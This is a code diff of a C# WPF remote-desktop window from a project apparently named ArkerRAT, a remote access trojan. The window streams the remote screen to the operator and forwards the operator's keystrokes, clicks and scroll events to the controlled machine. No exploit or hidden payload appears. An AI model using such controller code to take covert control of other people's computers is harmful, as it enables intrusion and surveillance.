@@ -1,20 +1,99 @@
-﻿using ArkerRAT1;
+﻿//using ArkerRAT1;
+//using System;
+//using System.Collections.Concurrent;
+//using System.Collections.Generic;
+//using System.Drawing;
+//using System.Drawing.Imaging;
+//using System.IO;
+//using System.Linq;
+//using System.Text;
+//using System.Threading;
+//using System.Threading.Tasks;
+//using System.Windows;
+//using System.Windows.Controls;
+//using System.Windows.Data;
+//using System.Windows.Documents;
+//using System.Windows.Input;
+//using System.Windows.Media;
+//using System.Windows.Media.Animation;
+//using System.Windows.Media.Imaging;
+//using System.Windows.Shapes;
+
+//namespace ArkerRatWpfVersion
+//{
+//    /// <summary>
+//    /// Interaction logic for RemoteDesktopWindow.xaml
+//    /// </summary>
+//    public partial class RemoteDesktopWindow : Window
+//    {
+//        public RATHostSession clientSession { get; set; }
+//        //A thread safe alternative for lists, and won get out of index.
+//        private Thread _frameRetrieverThread;
+//        public bool _isRunning = false;
+
+//        public RemoteDesktopWindow(RATHostSession session)
+//        {
+//            InitializeComponent();
+//            clientSession = session;
+//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
+//            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
+//        }
+
+//        private async void CloseWindow(object sender, RoutedEventArgs e)
+//        {
+//            Close();
+//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
+//            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
+//        }
+
+//        private void MaximizeWindow(object sender, RoutedEventArgs e)
+//        {
+
+//        }
+
+//        private void MinimizeWindow(object sender, RoutedEventArgs e)
+//        {
+//            this.WindowState = WindowState.Minimized;
+//        }
+
+//        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
+//        {
+//            if (e.LeftButton == MouseButtonState.Pressed)
+//            {
+//                DragMove();
+//            }
+//        }
+//        //_______________________________________________________________________________
+
+
+
+//        public void OnNewFrameRecieved(string chunk)
+//        {
+//            lock(GlobalVariables._lock)
+//            {
+//                _frameHandler.AddChunk(chunk);
+//            }
+//        }
+
+//    }
+
+
+
+//}
+
+using ArkerRAT1;
 using System;
 using System.Collections.Generic;
-using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
-using System.Linq;
-using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows;
 using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
 using System.Windows.Input;
 using System.Windows.Media;
+using System.Windows.Media.Animation;
 using System.Windows.Media.Imaging;
-using System.Windows.Shapes;
 
 namespace ArkerRatWpfVersion
 {
@@ -29,21 +108,58 @@ namespace ArkerRatWpfVersion
         {
             InitializeComponent();
             clientSession = session;
+            GlobalVariables.byteSize = 262144;
+            lock (GlobalVariables._lock)
+            {
+                clientSession.data = string.Empty;
+            }
+            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
             clientSession.remoteDesktopWindowIsAlreadyOpen = true;
-            clientSession.SendData("§RemoteDesktop§");
+            this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
+            this.PreviewMouseWheel+= new MouseWheelEventHandler(SendScrollToClient);
+        }
+
+        private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
+        {
+            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window
+
+            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);
+
+            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
+            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;
+
+            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY) + "," + e.Delta.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
+        }
+        private async void SendKeystrokesToClient(object sender, KeyEventArgs e)
+        {
+            e.Handled = true;
+            await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
         }
 
         private async void CloseWindow(object sender, RoutedEventArgs e)
         {
-            clientSession.base64strings.Clear();
-            clientSession.base64strings.Clear();
+            clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
             clientSession.remoteDesktopWindowIsAlreadyOpen = false;
+            GlobalVariables.byteSize = 1024;
             Close();
         }
 
+        bool zoom = true;
         private void MaximizeWindow(object sender, RoutedEventArgs e)
         {
-
+            if (zoom)
+            {
+                this.Width = this.Width * 2;
+                this.Height = this.Height * 2;
+                zoom = false;
+            }
+            else
+            {
+                this.Width = this.Width /2;
+                this.Height = this.Height / 2;
+                zoom= true;
+            }
+            
         }
 
         private void MinimizeWindow(object sender, RoutedEventArgs e)
@@ -51,98 +167,92 @@ namespace ArkerRatWpfVersion
             this.WindowState = WindowState.Minimized;
         }
 
-        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
+        private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
         {
-            if (e.LeftButton == MouseButtonState.Pressed)
+            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window
+
+            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);
+
+            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
+            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;
+
+            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY)+","+e.ChangedButton.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
+        }
+
+        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
+        {
+            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
             {
                 DragMove();
             }
         }
-        //_______________________________________________________________________________
-        List<byte> base64bytes = new List<byte>();
-        public async Task RemoteDesktopFunction()
+
+        private List<byte[]> _frameChunks = new List<byte[]>();
+
+        public void ReceiveFrameChunk(string frameChunk)
         {
-                string[] base64StringArray = clientSession.base64strings.ToArray();
 
-                string concatenatedBase64String = string.Join("", base64StringArray).Replace("§RemoteDesktopFrameDone§", string.Empty);
+            if (frameChunk == "§RemoteDesktopFrameDone§")
+            {
 
-                string[] concatenatedBase64StringArray = concatenatedBase64String.Split(new string[] { "§RemoteDesktop§" }, StringSplitOptions.RemoveEmptyEntries);
+                byte[] frameBytes = CombineFrameChunks();
 
-                foreach (string base64StringText in concatenatedBase64StringArray)
+                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                 {
-
-                    if (IsValidBase64String(base64StringText))
+                    try
                     {
-                        byte[] tempByteArray = Convert.FromBase64String(base64StringText);
-                        // Add the bytes to the list
-                        foreach (byte bytes in tempByteArray)
+                        using (MemoryStream ms = new MemoryStream(frameBytes))
                         {
-                            base64bytes.Add(bytes);
+                            BitmapImage bitmapImage = new BitmapImage();
+                            bitmapImage.BeginInit();
+                            bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
+                            bitmapImage.StreamSource = ms;
+                            bitmapImage.EndInit();
+
+                            remoteDesktopVideoFrame.Source = bitmapImage;
                         }
-                }
-            }
-
-            //Thread safe way of making the image
-            var bitmapImage = new BitmapImage();
-            try
-            {
-                using (var memoryStream = new MemoryStream(base64bytes.ToArray()))
-                {
-                    bitmapImage.BeginInit();
-                    bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
-                    bitmapImage.StreamSource = memoryStream;
-                    bitmapImage.EndInit();
-                    bitmapImage.Freeze();
-                }
-            }
-
-                
-            catch (Exception ex)
-            {
-                base64bytes.Clear();
-                clientSession.base64strings.Clear();
-                await clientSession.SendData("§RemoteDesktop§§Close§");
-                await clientSession.SendData("§RemoteDesktop§");
-            }
-
-
-
-            await Dispatcher.BeginInvoke(new Action(() =>
-                {
-                    remoteDesktopVideoFrame.Source = bitmapImage;
+                    }
+                    catch (Exception ex) { }
                 }));
 
-            // Clear the list of base64 strings
-            await clientSession.SendData("§RemoteDesktop§");
-            base64bytes.Clear();
-            clientSession.base64strings.Clear();
+                _frameChunks.Clear();
+
+            }
+            else
+            {
+                try
+                {
+                  
+                        byte[] chunkBytes = Convert.FromBase64String(frameChunk);
+                        _frameChunks.Add(chunkBytes);
+                    
+                }
+                catch (Exception ex) { return; }
+            }
         }
 
-        private bool IsValidBase64String(string base64String)
+        private byte[] CombineFrameChunks()
         {
-            // Check if the string is null or empty, or if its length is not divisible by 4
-            if (string.IsNullOrEmpty(base64String) || base64String.Length % 4 != 0)
-            {
-                return false;
-            }
+            int totalLength = 0;
+            
 
-            // Check if the string contains any whitespaces, tabs, or newlines
-            if (base64String.Contains(" ") || base64String.Contains("\t") || base64String.Contains("\r") || base64String.Contains("\n"))
-            {
-                return false;
-            }
+           
+                foreach (byte[] chunk in _frameChunks)
+                {
+                    totalLength += chunk.Length;
+                }
+                byte[] frameBytes = new byte[totalLength];
+                int currentIndex = 0;
 
-            try
-            {
-                // Try to convert the string to bytes
-                Convert.FromBase64String(base64String);
-                return true;
-            }
-            catch (FormatException)
-            {
-                // If the conversion fails, the string is not a valid base64 string
-                return false;
-            }
+                foreach (byte[] chunk in _frameChunks)
+                {
+                    Buffer.BlockCopy(chunk, 0, frameBytes, currentIndex, chunk.Length);
+                    currentIndex += chunk.Length;
+                }
+                return frameBytes;
+            
+
+
         }
     }
 }
